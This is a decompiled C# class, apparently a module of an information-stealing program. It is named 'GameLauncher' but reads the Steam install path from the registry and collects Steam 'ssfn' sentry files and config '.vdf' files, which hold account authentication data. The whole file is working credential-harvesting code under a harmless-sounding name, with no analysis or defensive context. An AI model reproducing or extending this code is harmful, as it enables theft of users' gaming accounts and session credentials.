using System;
using System.Collections.Generic;
using System.IO;
using Microsoft.Win32;

// Token: 0x02000026 RID: 38
public class GameLauncher : FileScanner
{
	// Token: 0x060000CC RID: 204 RVA: 0x00008C64 File Offset: 0x00006E64
	public override string GetFolder(FileScannerArg scannerArg, FileInfo fileInfo)
	{
		try
		{
			if (scannerArg.Directory.Contains("config"))
			{
				return "config";
			}
		}
		catch
		{
		}
		return string.Empty;
	}

	// Token: 0x060000CD RID: 205 RVA: 0x00008CB4 File Offset: 0x00006EB4
	public override IEnumerable<FileScannerArg> GetScanArgs()
	{
		List<FileScannerArg> list = new List<FileScannerArg>();
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software\\Valve\\Steam");
			if (registryKey == null)
			{
				return list;
			}
			string text = registryKey.GetValue("SteamPath") as string;
			if (!Directory.Exists(text))
			{
				return list;
			}
			list.Add(new FileScannerArg
			{
				Directory = text,
				Pattern = "*ssfn*",
				Recoursive = false
			});
			list.Add(new FileScannerArg
			{
				Directory = Path.Combine(text, "config"),
				Pattern = "*.vdf",
				Recoursive = false
			});
		}
		catch
		{
		}
		return list;
	}
}
